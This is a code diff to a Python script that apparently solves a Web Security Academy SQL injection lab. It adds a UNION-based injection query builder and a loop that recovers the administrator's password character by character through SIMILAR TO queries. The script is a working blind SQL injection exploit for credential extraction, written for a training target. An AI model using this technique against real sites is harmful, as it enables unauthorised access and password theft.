@@ -7,7 +7,7 @@ from bs4 import BeautifulSoup
 
 # Adding this so I can use IntelliJ's play button.
 # This value is only used if none is supplied from the command line.
-MANUAL_CTF_URL = "https://acab1f1d1fb2e396c03e1d7f00c30049.web-security-academy.net/"
+MANUAL_CTF_URL = "https://ac6f1f941eeb2aa2c1b8165a00200036.web-security-academy.net/"
 # Valid characters that will be used when finding the admin's password via SIMILAR TO with regex
 VALID_CHARSET = string.ascii_lowercase + string.digits
 
@@ -32,6 +32,11 @@ def checkIfTimedOut(response):
         raise Exception("CTF site has timed out, refresh challenge.")
 
 
+# Provided the query AND clause, returns a formatted sql injection query string
+def buildQuery(and_clause):
+    return f"x' UNION SELECT username FROM users WHERE username='administrator' AND {and_clause}--"
+
+
 # try_query
 # returns True when the query provided results in tricking the site backend by injecting a true statement
 # a.k.a when the WHERE clause is true, try_query returns true.
@@ -52,8 +57,7 @@ def try_query(query):
 def getPasswordLength():
     num = 1
     while True:
-        and_clause = f'length(password)={num}'
-        attempt_qry = f"x' UNION SELECT username FROM users WHERE username='administrator' AND {and_clause}--"
+        attempt_qry = buildQuery(and_clause=f'length(password)={num}')
         print(f'Trying length {num}')
         if not try_query(attempt_qry):
             num = num + 1
@@ -77,5 +81,19 @@ if __name__ == "__main__":
     #   now pw so far should be the password, so outside of any loops just try a SIMILAR_TO query w/ that pw to confirm
 
     pw_length = getPasswordLength()
+    hold_password = ""
+    while len(hold_password) < pw_length:
+        for char in VALID_CHARSET:
+            qry = buildQuery(and_clause=f'password SIMILAR TO \'{hold_password+char+"%"}\'')
+            if try_query(qry):
+                hold_password = hold_password + char
+                print(f'New char discovered; password so far: {hold_password}')
+                break
+
+    # Now just confirm that the above loop found the correct password:
+    if try_query(buildQuery(and_clause=f'password SIMILAR TO \'{hold_password}\'')):
+        print(f'Search complete...\n`administrator` password is: {hold_password}\n')
+    else:
+        print(f'Something went wrong: {hold_password} seems to be an incorrect password.\n')
 
     print(f"Time elapsed is {time.perf_counter() - begin_time} (seconds)")
